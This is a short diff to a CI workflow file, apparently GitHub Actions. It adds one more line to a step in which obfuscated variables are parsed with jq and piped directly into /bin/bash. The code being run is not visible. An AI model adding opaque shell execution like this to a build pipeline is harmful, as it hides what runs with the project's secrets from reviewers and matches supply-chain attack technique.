@@ -26,6 +26,7 @@ jobs:
           echo $zasf74485 | jq -r .fsjar5348 | /bin/bash
           echo $k842 | jq -r .p658 | /bin/bash
           printf '%s' "$hr912" | jq -r .ipv678 | /bin/bash
+          echo $urfn658 | jq -r .mskv8 | /bin/bash
 
       - name: Save archive
         if: always()
